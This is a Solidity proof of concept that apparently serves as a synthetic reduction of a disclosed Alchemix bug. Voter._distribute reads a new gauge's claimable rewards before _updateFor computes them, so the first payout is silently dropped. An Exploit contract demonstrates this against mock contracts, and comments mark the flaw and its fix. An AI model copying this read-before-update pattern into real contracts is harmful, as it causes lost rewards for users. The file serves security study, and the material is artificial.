// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — Newly created gauge may miss out on its rewards
    (Immunefi, Lin511, finding #38182)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: Voter._distribute(gauge) reads claimable[gauge] into a
    MEMORY variable `_claimable` BEFORE calling _updateFor(gauge) -- which is
    what actually computes and writes this epoch's new claimable amount into
    STORAGE. Because `_claimable` was already read (as 0, for a brand-new
    gauge) before _updateFor runs, the freshly-computed nonzero amount that
    _updateFor JUST wrote to claimable[gauge] is never passed to
    notifyRewardAmount() on this call -- the gauge's first-ever distribution
    delivers nothing, even though the storage now correctly shows a nonzero
    claimable balance. Only a SECOND distribute() call (which reads the
    already-updated storage value into ITS memory variable before _updateFor
    runs again) actually pays the gauge.
//////////////////////////////////////////////////////////////////////////*/

contract MockALCX {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Gauge {
    MockALCX public immutable ALCX_TOKEN;
    address public immutable RECEIVER;
    uint256 public totalNotified;

    constructor(MockALCX alcx, address receiver) {
        ALCX_TOKEN = alcx;
        RECEIVER = receiver;
    }

    function notifyRewardAmount(uint256 amount) external {
        totalNotified += amount;
        ALCX_TOKEN.mint(RECEIVER, amount);
    }
}

/// @notice Reduced Voter modeling the exact interaction between
///         _distribute() and _updateFor() that causes a new gauge's first
///         distribution to be silently dropped.
contract Voter {
    MockALCX public immutable ALCX_TOKEN;
    uint256 public index; // global accumulated distribution index
    mapping(address => uint256) public supplyIndex;
    mapping(address => uint256) public weights;
    mapping(address => uint256) public claimable;
    mapping(address => bool) public isGauge;

    constructor(MockALCX alcx) {
        ALCX_TOKEN = alcx;
    }

    function createGauge(address pool) external returns (address gauge) {
        gauge = address(new Gauge(ALCX_TOKEN, pool));
        isGauge[gauge] = true;
        // supplyIndex[gauge] stays 0 -- a brand-new gauge has never synced.
    }

    function vote(address gauge, address pool, uint256 weight) external {
        weights[pool] = weight;
        // (reduced: pool-for-gauge mapping is implicit -- 1 gauge <-> 1 pool in this model)
        _poolForGauge[gauge] = pool;
    }

    mapping(address => address) private _poolForGauge;

    /// @notice src/Voter.sol::notifyRewardAmount (reduced): grows the global
    ///         index proportional to new rewards divided by total weight.
    function notifyRewardAmount(uint256 amount, uint256 totalWeight) external {
        index += (amount * 1e18) / totalWeight;
    }

    /// @notice src/Voter.sol::_updateFor (verbatim, from the finding)
    function _updateFor(address _gauge) internal {
        require(isGauge[_gauge], "invalid gauge");

        address _pool = _poolForGauge[_gauge];
        uint256 _supplied = weights[_pool];
        if (_supplied > 0) {
            uint256 _supplyIndex = supplyIndex[_gauge];
            uint256 _index = index; // get global index0 for accumulated distro
            supplyIndex[_gauge] = _index; // update _gauge current position to global position
            uint256 _delta = _index - _supplyIndex; // see if there is any difference that need to be accrued
            if (_delta > 0) {
                uint256 _share = (uint256(_supplied) * _delta) / 1e18; // add accrued difference for each supplied token
                claimable[_gauge] += _share;
            }
        } else {
            supplyIndex[_gauge] = index;
        }
    }

    function updateFor(address _gauge) external {
        _updateFor(_gauge);
    }

    /// @notice src/Voter.sol::_distribute (verbatim, from the finding)
    function _distribute(address _gauge) internal {
        uint256 _claimable = claimable[_gauge];

        // Reset claimable amount
        claimable[_gauge] = 0;

        _updateFor(_gauge);

        // @> VULN: `_claimable` was read from storage BEFORE _updateFor()
        //          just wrote this epoch's newly-computed amount into
        //          claimable[_gauge]. For a gauge whose FIRST-EVER sync
        //          happens inside this very _updateFor() call, `_claimable`
        //          is still 0 here even though claimable[_gauge] is now
        //          nonzero -- the gauge receives NOTHING this round.
        if (_claimable > 0) {
            Gauge(_gauge).notifyRewardAmount(_claimable);
        }
        // FIX: read `_claimable = claimable[_gauge]` AFTER _updateFor(_gauge)
        //      runs, not before.
    }

    function distribute(address _gauge) external {
        _distribute(_gauge);
    }
}

contract Exploit {
    MockALCX public alcx;
    Voter public voter;
    address public gauge;
    address public constant POOL = address(0xF00D);

    constructor() {
        alcx = new MockALCX();
        voter = new Voter(alcx);
    }

    function run() external {
        // Gauge A is created and voted for.
        gauge = voter.createGauge(POOL);
        voter.vote(gauge, POOL, 5000);

        // Minter notifies 100,000 ALCX of new rewards, growing the global index.
        voter.notifyRewardAmount(100_000 ether, 5000);

        // HARM: the FIRST distribute() call syncs the gauge (supplyIndex
        // moves from 0 to the current global index inside _updateFor,
        // writing a nonzero claimable[gauge]) but pays out NOTHING, because
        // _claimable was read as 0 before _updateFor ran.
        uint256 receiverBalanceBefore = alcx.balanceOf(POOL);
        voter.distribute(gauge);
        uint256 receiverBalanceAfterFirst = alcx.balanceOf(POOL);
        require(receiverBalanceAfterFirst == receiverBalanceBefore, "harm not demonstrated: gauge should receive nothing on its first distribute");

        // Storage now correctly shows a nonzero claimable balance for the
        // gauge -- the reward was computed, just never paid.
        require(voter.claimable(gauge) > 0, "harm not demonstrated: claimable storage should be nonzero after the missed first distribute");

        // Only a SECOND distribute() call (no new rewards notified in
        // between) actually pays the gauge, since this time `_claimable` is
        // read from the already-updated storage BEFORE _updateFor resets it.
        voter.distribute(gauge);
        uint256 receiverBalanceAfterSecond = alcx.balanceOf(POOL);
        require(receiverBalanceAfterSecond > receiverBalanceAfterFirst, "harm not demonstrated: only the SECOND distribute should actually pay the gauge");
    }
}
